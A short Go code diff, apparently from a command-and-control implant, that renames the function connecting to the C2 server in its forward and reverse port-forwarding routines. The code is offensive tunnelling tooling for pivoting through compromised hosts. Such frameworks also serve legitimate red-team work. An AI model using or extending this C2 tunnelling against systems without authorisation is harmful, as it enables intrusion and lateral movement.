@@ -105,7 +105,7 @@ func PortFwd(addr, sessionID, protocol string, reverse bool, timeout int) (err e
 		logging.Printf("PortFwd (reversed) started: %s (%s)", addr, sessionID)
 		go listenAndFwd(ctx, cancel, addr, sessionID) // here addr is a port number to listen on
 	} else {
-		conn, ctx, cancel, err = c2transport.ConnectCC(url)
+		conn, ctx, cancel, err = c2transport.EstablishC2Connection(url)
 		if err != nil {
 			return fmt.Errorf("failed to connect to CC: %v", err)
 		}
@@ -160,7 +160,7 @@ func listenAndFwd(ctx context.Context, cancel context.CancelFunc,
 			shID)
 
 		// start a h2 connection per incoming TCP connection
-		h2, _, h2cancel, err := c2transport.ConnectCC(url)
+		h2, _, h2cancel, err := c2transport.EstablishC2Connection(url)
 		if err != nil {
 			logging.Printf("h2conn (%s) failed: %v", url, err)
 			return
